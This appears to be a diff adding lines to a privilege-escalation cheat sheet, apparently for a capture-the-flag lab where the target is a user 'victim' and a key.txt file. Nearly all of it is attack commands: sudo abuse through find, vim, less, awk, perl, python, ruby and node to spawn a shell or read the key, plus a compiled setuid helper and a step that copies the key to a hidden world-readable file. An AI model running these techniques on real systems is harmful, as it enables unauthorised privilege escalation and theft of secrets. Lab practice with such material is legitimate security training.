@@ -23,3 +23,33 @@ SELECT LOAD_FILE('/var/lib/mysql-files/key.txt')
 
 sudo -l
 sudo -u victim /bin/bash
+sudo -u victim /usr/bin/find /home/victim -name key.txt -exec cat {} \;
+sudo -u victim /usr/bin/find /home/victim -name key.txt -exec bash \;
+sudo -u victim vim #:!/bin/bash
+sudo -u victim less #:!/bin/bash
+sudo -u victim awk '{print $1}' /home/victim/key.txt #awk 'BEGIN {system("/bin/bash")}'
+
+ls -l /usr/bin/passwd
+#s setgid setuid  program by chmod
+#int main(void)
+#{
+#system("cat /home/victim/key.txt");
+#}
+gcc -o /tmp/[FILE] [FILE].c
+chmod +xs [FILE]
+sudo -u victim perl -e 'print  `cat /home/victim/key.txt `'
+sudo -u victim perl -e 'print  `/bin/bash `'
+cp /home/victim/key.txt /tmp/.key
+chmod 777 /tmp/.key
+
+sudo -u victim python
+#from subprocess import call
+#call(['/bin/bash'])
+
+sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)' #puts  `cat /home/victim/key.txt`
+
+sudo -u victim node
+#var exec = require('child_process').exec;
+#exec('[COMMAND]', function (error, stdOut, stdErr) {
+#console.log(stdOut);
+#});
